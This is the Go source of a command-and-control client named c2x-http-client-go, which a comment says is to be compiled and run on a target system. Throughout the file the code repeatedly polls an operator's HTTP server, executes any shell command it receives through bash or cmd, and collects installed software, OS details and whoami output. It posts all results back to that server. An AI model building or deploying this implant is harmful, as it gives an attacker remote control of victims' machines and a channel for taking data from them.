package main

import (
	"github.com/asmcos/requests"
	"os"
	"os/exec"
	"time"

	"github.com/akamensky/argparse"
	"github.com/matishsiao/goInfo"
)

/*
c2x-http-client-go is client of c2x you should compile it and run it in target system
c2x-http-client-go repo : https://github.com/nxenon/c2x-http-client-go
c2x-http project : https://github.com/nxenon/c2x-http
*/

// Create global vars
var serverRemoteURL string
var clientID string
var clientToken string


func main(){

	var ip = "replace_server_ip"
	var port = "replace_server_port"
	var protocol = "replace_server_protocol"

	parser := argparse.NewParser("c2x-client", "Connect to Server")
	ip_arg := parser.String("", "ip", &argparse.Options{Required: false, Help: "Server IP",
		Default: ip})

	port_arg := parser.String("", "port", &argparse.Options{Required: false, Help: "Server Port",
		Default: port})

	protocol_arg := parser.String("", "protocol", &argparse.Options{Required: false, Help: "Server Protocol [http or https]",
		Default: protocol})

	parser.Parse(os.Args)

	serverRemoteURL = *protocol_arg + "://" + *ip_arg + ":" + *port_arg + "/"

	for true {
		connectToServer()
		time.Sleep(3 * time.Second)
	}

}

func connectToServer(){

	// function for connecting to server

	os_info := goInfo.GetInfo()
	var os_name = os_info.GoOS + " " + os_info.Core

	params := requests.Params{
		"req_type" : "new",
		"client_os" : os_name,
	}

	resp, err := requests.Get(serverRemoteURL, params)

	if err != nil{
		return
	}

	var resp_json map[string]string
	err2 := resp.Json(&resp_json)
	if err2 != nil {
		return
	}

	clientID = resp_json["client_id"]
	clientToken = resp_json["token"]

	sendGetSignal()

}

func sendGetSignal() {

	// function for send get signal and get command from server

	for true{

		time.Sleep(3 * time.Second)

		params := requests.Params{
			"req_type" : "get-signal",
			"client_id" : clientID,
			"token" : clientToken,
		}

		resp, err := requests.Get(serverRemoteURL, params)
		if err != nil{
			return
		}

		var resp_json map[string]string
		err2 := resp.Json(&resp_json)
		if err2 != nil {
			return
		}

		resp_type := resp_json["resp_type"]

		if resp_type == "no_cmd"{
			continue

		} else if resp_type == "reset"{
			return

		} else if resp_type == "bad_token"{
			return

		}  else if resp_type == "run_cmd"{
			cmd := resp_json["cmd"]
			cmd_id := resp_json["cmd_id"]
			executeCommand(cmd, cmd_id)

		} else if resp_type == "special_cmd"{
			s_cmd := resp_json["s_cmd"]
			cmd_id := resp_json["cmd_id"]
			interpretSpecialCmd(s_cmd, cmd_id)

		}
	}

}

func sendPostOutput(
	cmd_id, output string,
	){

	// send output of executed command

	request_params := requests.Datas{
		"resp_type" : "send_output",
		"client_id" : clientID,
		"token" : clientToken,
		"cmd_id" : cmd_id,
		"output" : output,
	}

	_, err := requests.Post(serverRemoteURL, request_params)
	if err != nil{
		return
	}

}

func interpretSpecialCmd(
	s_cmd, cmd_id string,
	){

	// interpret special commands

	if s_cmd == "get_os" {
		sendOsInfo(cmd_id)
	} else if s_cmd == "get_software" {
		sendSoftware(cmd_id)
	} else if s_cmd == "whoami"{
		sendWhoamiOutput(cmd_id)
	}

}

func executeCommand(
	cmd, cmd_id string,
){

	// execute command

	os_info := goInfo.GetInfo()

	var executable_name string
	var command_arg string

	if os_info.GoOS == "linux" {
		executable_name = "bash"
		command_arg = "-c"

	} else if os_info.GoOS == "windows" {
		executable_name = "cmd"
		command_arg = "/c"

	} else {
		output := "OS Not Detected"
		sendPostOutput(cmd_id, output)
		return

	}

	out, err := exec.Command(executable_name, command_arg, cmd).Output()

	if err != nil {
		output := err.Error()
		sendPostOutput(cmd_id, output)
		return

	}
	output := string(out)
	sendPostOutput(cmd_id, output)

}

func sendSoftware(
	cmd_id string,
	){

	// send software installed on system

	os_info := goInfo.GetInfo()

	var output string
	var command string

	if os_info.GoOS == "linux" {
		command = "ls /usr/bin /opt"
		out, err := exec.Command("bash", "-c", command).Output()
		if err != nil {
			output = err.Error()
		} else {
			output = string(out)
		}
	} else if os_info.GoOS == "windows" {
		command = "Get-WmiObject -Class Win32_Product | Select-Object -Property Name"
		out, err := exec.Command("powershell", "/c", command).Output()
		if err != nil {
			output = err.Error()
		} else {
			output = string(out)
		}

	} else {
		output = "OS Not Detected ---> " + os_info.GoOS + " : " + os_info.Core
	}

	sendPostOutput(cmd_id, output)

}

func sendOsInfo(
	cmd_id string,
	){

	// send os info

	os_info := goInfo.GetInfo()
	var os_name = os_info.GoOS + " " + os_info.Core

	sendPostOutput(cmd_id, os_name)

}

func sendWhoamiOutput(
	cmd_id string,
	){

	// send whoami output

	os_info := goInfo.GetInfo()

	var executable_name string
	var command_arg string

	if os_info.GoOS == "linux" {
		executable_name = "bash"
		command_arg = "-c"

	} else if os_info.GoOS == "windows" {
		executable_name = "cmd"
		command_arg = "/c"

	} else {
		output := "OS Not Detected"
		sendPostOutput(cmd_id, output)
		return

	}

	out, err := exec.Command(executable_name, command_arg, "whoami").Output()

	if err != nil {
		output := err.Error()
		sendPostOutput(cmd_id, output)
		return

	}

	output := string(out)
	sendPostOutput(cmd_id, output)

}